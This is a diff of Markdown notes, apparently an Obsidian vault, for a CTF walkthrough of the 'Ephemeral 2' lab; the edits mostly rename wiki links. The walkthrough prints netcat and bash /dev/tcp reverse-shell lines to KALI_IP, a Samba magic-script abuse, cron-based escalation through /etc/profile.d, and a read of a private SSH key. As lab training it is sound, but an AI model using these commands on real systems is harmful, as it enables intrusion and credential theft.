@@ -4,9 +4,9 @@
 
 Ephemeral 2 is a medium-level CTF challenge involving multiple steps of exploitation, including Samba server vulnerabilities and a script with improper input validation. The challenge begins with an [[Nmap]] scan revealing open ports, followed by directory enumeration using [[Gobuster]]. The user discovers Samba users and successfully brute-forces the password for user 'randy' with Metasploit.
 
-Accessing the SMB share, the user finds a configuration that allows a [[Reverse Shell]] to be executed. After establishing a shell, the user leverages a cron job running as another user to escalate privileges. The final step involves placing a [[Reverse Shell]] script in the `/etc/profile.d/` folder, which grants root access when the cron job executes.
+Accessing the SMB share, the user finds a configuration that allows a [[_MOCS/Reverse Shells]] to be executed. After establishing a shell, the user leverages a cron job running as another user to escalate privileges. The final step involves placing a [[_MOCS/Reverse Shells]] script in the `/etc/profile.d/` folder, which grants root access when the cron job executes.
 
-This walkthrough demonstrates techniques such as service enumeration, brute force attacks, [[Reverse Shell]] execution, and privilege escalation through cron jobs and writable directories.
+This walkthrough demonstrates techniques such as service enumeration, brute force attacks, [[_MOCS/Reverse Shells]] execution, and privilege escalation through cron jobs and writable directories.
 
 **Run initial [[Nmap]] scan to discover ports 22, 80, 139, and 445 are open:**
 
@@ -166,19 +166,19 @@ magic script = smbscript.elf
 guest ok = no
 ```
 
-**In KALI, Create a bash script file named** `smbscript.elf` **containing the following [[Reverse Shell]] command (replace KALI_IP):**
+**In KALI, Create a bash script file named** `smbscript.elf` **containing the following [[_MOCS/Reverse Shells]] command (replace KALI_IP):**
 
 ```bash
 mknod backpipe p; nc KALI_IP 31337 0<backpipe | /bin/bash 1>backpipe
 ```
 
-**Start a netcat listener in KALI to receive the [[Reverse Shell]]:**
+**Start a netcat listener in KALI to receive the [[_MOCS/Reverse Shells]]:**
 
 ```bash
 nc -nvlp 31337
 ```
 
-**Then, in the SMB client, put the** `smbscript.elf` **into the** `SYSADMIN` **share to launch the [[Reverse Shell]]:**
+**Then, in the SMB client, put the** `smbscript.elf` **into the** `SYSADMIN` **share to launch the [[_MOCS/Reverse Shells]]:**
 
 ```bash
 smb: \> put smbscript.elf 
@@ -231,7 +231,7 @@ cat /home/ralph/tools/ssh.sh
 /usr/bin/ssh -o "StrictHostKeyChecking no" ralph@localhost -i /home/ralph/.ssh/id_rsa
 ```
 
-**Run [[Linpeas]] and see that we have write access to** `/etc/profile.d`
+**Run [[LinPEAS]] and see that we have write access to** `/etc/profile.d`
 
 ```bash
 ...randy@ephemeral:/home/randy$ python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
@@ -264,21 +264,21 @@ You have write privileges over /etc/profile.d/cedilla-portuguese.sh
 ...
 ```
 
-**On your KALI machine use netcat to accept [[Reverse Shell]]**
+**On your KALI machine use netcat to accept [[_MOCS/Reverse Shells]]**
 
 ```bash
 └─$ nc -nlvp 9999
 listening on [any] 9999 ...
 ```
 
-**Create another [[Reverse Shell]] script in** `/etc/profile.d` **folder and wait for the cronjob to work (replace KALI_IP)**
+**Create another [[_MOCS/Reverse Shells]] script in** `/etc/profile.d` **folder and wait for the cronjob to work (replace KALI_IP)**
 
 ```bash
 #!/bin/bash
 bash -i >& /dev/tcp/KALI_IP/9999 0>&1
 ```
 
-**Once the cronjob runs and you get your ralph [[Reverse Shell]], grab the ssh key:**
+**Once the cronjob runs and you get your ralph [[_MOCS/Reverse Shells]], grab the ssh key:**
 
 ```bash
 ralph@ephemeral:~$ cat /home/ralph/.ssh/id_rsa
